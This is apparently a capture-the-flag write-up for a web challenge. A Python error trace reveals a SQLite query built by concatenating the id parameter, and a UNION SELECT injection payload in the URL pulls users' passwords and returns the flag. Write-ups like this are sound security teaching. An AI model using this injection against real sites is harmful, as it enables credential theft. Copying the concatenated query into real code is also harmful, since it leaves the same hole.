# Meet the Union Committee

**Category**: Web \
**Points**: 100 (101 solves) \
**Author**: BananaMan

## Challenge

A committee was formed last year to decide the highly-sensitive contents of our challenges. All we could find is their profiles on this website. They are super paranoid that their profile site is hackable and decided to implement insane rate limits. Really we need to get access to the admin's password. If only that was possible.

http://34.105.202.19:1336/

## Solution


Go to http://34.105.202.19:1336/?id=%3Cshit%3E:
```
Traceback (most recent call last):
  File "unionflaggenerator.py", line 49, in do_GET
    cursor.execute("SELECT id, name, email FROM users WHERE id=" + params["id"])
sqlite3.OperationalError: near "<": syntax error
```

SQLi:
```sql
SELECT id, name, email FROM users WHERE id=1 UNION SELECT id, password, email FROM users
```

Go to http://34.105.202.19:1336/?id=1%20UNION%20SELECT%20id,%20password,%20email%20FROM%20users:

```
union{uni0n_4ll_s3l3ct_n0t_4_n00b}
```
